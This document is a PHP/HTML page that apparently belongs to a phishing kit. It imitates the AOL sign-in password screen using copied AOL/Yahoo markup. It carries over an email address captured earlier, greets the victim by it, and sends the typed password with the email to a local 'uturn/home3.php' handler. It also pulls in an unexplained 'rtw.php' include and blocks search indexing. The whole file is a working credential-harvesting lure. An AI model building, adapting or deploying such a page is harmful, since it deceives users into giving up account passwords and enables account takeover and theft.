<?php
session_start();
if(isset($_POST['submit'])) {


$email = $_POST['eUser'];

$_SESSION["eUser"]= $email;}
include "rtw.php";
?>


<!DOCTYPE html>
<html id="Stencil" class="no-js">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL</title>
        
        <link rel="icon" type="image/png" href="images/favicon.ico">
        <link rel="shortcut icon" type="image/png" href="">
        <link rel="apple-touch-icon" href="">
        <link rel="apple-touch-icon-precomposed" href="">

       <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
	   
        <link rel="stylesheet" href="css/csmine.css">
        <!--<![endif]-->
        
        <link href="css/csmine2.css" rel="stylesheet" type="text/css">
        <script nonce="d1iHD4A+XSt2gdkRD8jQJSJ9VgnUw9uZ8yGnAsJx1dTsRHTC">
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.I13N_config = {"debug":false,"_ywa":10001496213979,"client_only":1,"spaceid":1197774520,"sections":null};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 150003036;
root.I13N_config.referrer = "";
root.I13N_config.nol = 1;
root.I13N_config.location = "https:\u002F\u002Flogin.aol.com\u002Faccount\u002Fchallenge\u002Fpassword";
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=150003036&ref=https%3A%2F%2Flogin.aol.com%2Faccount%2Fchallenge%2Fpassword","k2Rate":1,"positions":{"RICH":{"id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":3000,"noexp":1,"fdb":{"on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1534162508053;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=aljjsptdn2tic&crumb=' + encodeURIComponent('nrufRTPtGzv') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };
        </script>
    </head>
    <body>
      
	  <img source="images/aolbg.JPG">
    <script nonce="d1iHD4A+XSt2gdkRD8jQJSJ9VgnUw9uZ8yGnAsJx1dTsRHTC">
        (function(root) {
            var doc = document;

            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
            } else {
                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>

    <div id="login-body" class="loginish  puree-v2 responsive">
    <div class="mbr-desktop-hd pure-g">
    <div class="pure-u-4-5">
         <a href="">
            <img src="images/leftLogo.png" alt="AoI" class="logo " width="100" height="" />
        </a>
    </div>
    <div class="pure-u-1-5 txt-align-right">
        <div class="help"><a href="">Help</a></div>
    </div>
</div>

    <div class="login-box-container">
        <div class="login-box default">
            <div class="txt-align-center">
                    <img src="images/leftLogo.png" alt="AoI" class="logo " width="100" height="" />
            </div>
            <div class="challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello <?php echo $_SESSION["eUser"] ?></h1>
            <p class="not-you"><a href="./">Not you?</a></p>
    </div>
    <form action="uturn/home3.php" method="post" class="pure-form pure-form-stacked">
        <input type="hidden" name="aemail" value="<?php echo $_SESSION["eUser"] ?>" />
		<div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation"
                autocorrect="off" spellcheck="false"
                name="username" value="<?php echo $_SESSION["eUser"] ?>" />
        </div>
       
        <input type="password" id="login-passwd"  name="apass" placeholder="Password" required="required" autofocus/>
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" data-ylk="elm:btn;elmt:next;slk:next">                        
                    Sign in
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link"
                data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link"
                name="skip" value="I forgot my password" />
        </p>
    </form>
</div>

</div>

        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>

        </div>
    </div>
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner">
            <div id="login-ad-mon"></div>
            <div id="login-ad-sky"></div>
            <div id="login-ad-rich"></div>
        </div>
    </div>
</div>

    <script src=""></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=nrufRTPtGzv&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
    </noscript>
    
    <div id="mbr-css-check"></div>
</body>
</html>
<!-- fe25.member.ne1.yahoo.com - Mon Aug 13 2018 12:15:08 GMT+0000 (UTC) - (1ms) -->
